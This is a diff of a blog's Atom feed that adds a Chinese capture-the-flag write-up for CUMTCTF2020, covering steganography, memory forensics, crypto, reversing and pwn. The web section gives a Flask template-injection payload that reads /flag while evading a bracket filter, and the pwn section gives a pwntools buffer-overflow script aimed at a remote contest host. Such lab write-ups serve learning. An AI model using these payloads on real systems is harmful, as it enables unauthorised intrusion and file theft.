@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://7usai.github.io</id>
     <title>7usai</title>
-    <updated>2020-10-21T16:26:02.217Z</updated>
+    <updated>2020-10-27T08:54:07.599Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://7usai.github.io"/>
     <link rel="self" href="https://7usai.github.io/atom.xml"/>
@@ -17,20 +17,72 @@
         </link>
         <updated>2020-10-21T15:54:07.000Z</updated>
         <content type="html"><![CDATA[<h1 id="cumtctf2020华为杯">CUMTCTF2020华为杯</h1>
+<p>[TOC]</p>
 <h2 id="misc">misc</h2>
-<h3 id="签个到吧">签个到吧</h3>
+<h3 id="signin">SignIn</h3>
 <p>十六进制编译器打开，复制后base64解码，在brainfuck解码，得flag=CUMTCTF{Welcome_to_CUMTCTF_2020_Final}</p>
 <h3 id="出个流量分析题吧">出个流量分析题吧</h3>
 <p>wireshark打开，搜索flag字符串就找到</p>
 <h3 id="出个lsb吧">出个LSB吧</h3>
 <p>解压发现是个图片，用stegsolve打开，发现在red/green/blue plane0 上方有不明黑色块，在analyse中打开data extract，勾选三个0，save bin 以png格式保存，得到一张二维码</p>
+<h3 id="出个文档吧">出个文档吧</h3>
+<p>打开docx文件，明文是摩斯密码，解密得FLAG IS NOT HERE，提示flag不是这个。猜测是文件隐写，检查文档发现隐藏的flag:</p>
+<figure data-type="image" tabindex="1"><img src="https://7usai.github.io/post-images/1603788730325.jpg" alt="" loading="lazy"></figure>
+<h3 id="出个伪web吧">出个伪web吧</h3>
+<p>就硬照，找到后加上flag{}</p>
+<h3 id="出个压缩包吧">出个压缩包吧</h3>
+<p>解压得到的flag.rar文件放入十六进制编译器后，发现其中有个隐藏的secret.png，其中头文件错了，将7A改为74</p>
+<figure data-type="image" tabindex="2"><img src="https://7usai.github.io/post-images/1603788744549.png" alt="" loading="lazy"></figure>
+<p>得到的secret.png放入十六进制编译器后</p>
+<figure data-type="image" tabindex="3"><img src="https://7usai.github.io/post-images/1603788753774.png" alt="" loading="lazy"></figure>
+<p>文件后缀改为gif后放入stegsolve</p>
+<figure data-type="image" tabindex="4"><img src="https://7usai.github.io/post-images/1603788760915.png" alt="" loading="lazy"></figure>
+<p>发现只有一半，分离图层</p>
+<figure data-type="image" tabindex="5"><img src="https://7usai.github.io/post-images/1603788769865.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="6"><img src="https://7usai.github.io/post-images/1603788779016.png" alt="" loading="lazy"></figure>
+<p>补全左上角和右上角扫描得flag</p>
+<h3 id="出个内存取证吧">出个内存取证吧</h3>
+<p>得到一份镜像文件，用Volatility进行分析</p>
+<p>分析镜像：volatility -f memory.img imageinfo</p>
+<figure data-type="image" tabindex="7"><img src="https://7usai.github.io/post-images/1603788789704.png" alt="" loading="lazy"></figure>
+<p>猜测profile值为Win2003SP1x86</p>
+<p>查看进程：volatility -f memory.img --profile=Win2003SP1x86 pslist</p>
+<figure data-type="image" tabindex="8"><img src="https://7usai.github.io/post-images/1603788798868.png" alt="" loading="lazy"></figure>
+<p>发现一个DumpIT.exe</p>
+<p>查看之前运行过的进程： volatility -f memory.img --profile=Win2003SP1x86 userassist<br>
+提取explorer.exe进程：volatility -f memory.img --profile=Win2003SP1x86 memdump -p 1992 --dump-dir=./</p>
+<p>得到1992.dmp文件，然后foremost 1992.dmp -T提取</p>
+<p>在png文件夹里里发现了4个图片</p>
+<figure data-type="image" tabindex="9"><img src="https://7usai.github.io/post-images/1603788809653.png" alt="" loading="lazy"></figure>
+<p>扫描得jfXvUoypb8p3zvmPks8kJ5Kt0vmEw0xUZyRGOicraY4=</p>
+<p>有key值和vi，为AES加密</p>
+<p>http://tool.chacuo.net/cryptaes</p>
 <h2 id="crypto">Crypto</h2>
 <h3 id="classical">Classical</h3>
 <p>vigenere密码</p>
 <p>https://www.guballa.de/vigenere-solver</p>
 <h3 id="earsa">eaRSA</h3>
 <p>winner attack</p>
-<p>直接跑脚本就得出flag</p>
+<p>网上找的轮子，直接跑脚本就得出flag</p>
+<h2 id="web">Web</h2>
+<h3 id="doge">doge</h3>
+<p>真签到题，抽个奖就给出了flag</p>
+<h3 id="babyflask">babyflask</h3>
+<p>刚进入页面，只有一张图片，查看源码也没发现什么</p>
+<p>就是了模板注入</p>
+<pre><code>url+{{7*7}}
+</code></pre>
+<p>页面出现404报错，并且显示的是url+49，确定是模板注入</p>
+<pre><code>{{''.__class__.__mro__[2].__subclasses__()}}
+查看模块时，发现存在waf
+经过测试发现是过滤了[]
+于是使用
+{{''.__class__.__mro__.__getitem__(2).__subclasses__()}}
+存在file模块
+用read读取文件内容
+exp:
+''.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)('/flag').read()  
+</code></pre>
 <h2 id="re">re</h2>
 <h3 id="hello_world">hello_world</h3>
 <p>无壳，64位，直接放入IDA</p>
@@ -109,12 +161,12 @@ print (c)
 }
 </code></pre>
 <p>通过b和a中得数已知，相当于循环4次，每次b[i]=a[4 * i +j] * flag[j] + a[4 * i +j+1] * flag[j+1] + a[4 * i +j+2] * flag[j+2] + a[4 * i +j+3] * flag[j+3]，相当于如下线性方程组</p>
-<figure data-type="image" tabindex="1"><img src="https://7usai.github.io/post-images/1603295672508.gif" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="10"><img src="F:%5Cmarkdown%5CTypora%5CSAVES%5Cblog%E5%9B%BE%E7%89%87%5C042014092413.gif" alt="线性方程组" loading="lazy"></figure>
 <p>其中x为flag</p>
 <p>可以直接在线网站求解的4个十进制数</p>
 <p>https://www.buildenvi.com/gongju/formula/3lck4</p>
 <p>再转为hex得flag</p>
-<figure data-type="image" tabindex="2"><img src="https://7usai.github.io/post-images/1603295679988.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="11"><img src="https://7usai.github.io/post-images/1603788824640.png" alt="" loading="lazy"></figure>
 <p>用z3或者matlab是最好的，这里给出z3脚本</p>
 <pre><code>from z3 import *
 s=Solver()
@@ -133,6 +185,28 @@ if s.check() == sat:
     flag.append(ans[x4])
 print(flag)
 </code></pre>
+<h2 id="pwn">pwn</h2>
+<h3 id="login">login</h3>
+<pre><code>#!/usr/bin/env python2
+#-*- coding:utf-8 -*
+from pwn import *
+context.log_level='debug'
+context.arch='amd64'
+context.os='linux'
+#r=process('./login')
+r=remote('219.219.61.234',10000)
+#gdb.attach(r)
+r.recvuntil(&quot;choice: &quot;)
+r.sendline(&quot;1&quot;)
+r.recvuntil(&quot;Enter your username(length less than 20):&quot;)
+r.sendline('aaaa')
+r.recvuntil(&quot;Enter your password(length less than 20):&quot;)
+payload='a'*0x48+p64(0x004009F7)
+r.send(payload)
+r.interactive()
+</code></pre>
+<h3 id="login_plus">login_plus</h3>
+<p>将__int 64 的数付给 int 的数，存在整数溢出，输入 4294967296，就可以拿到 flag</p>
 ]]></content>
     </entry>
     <entry>
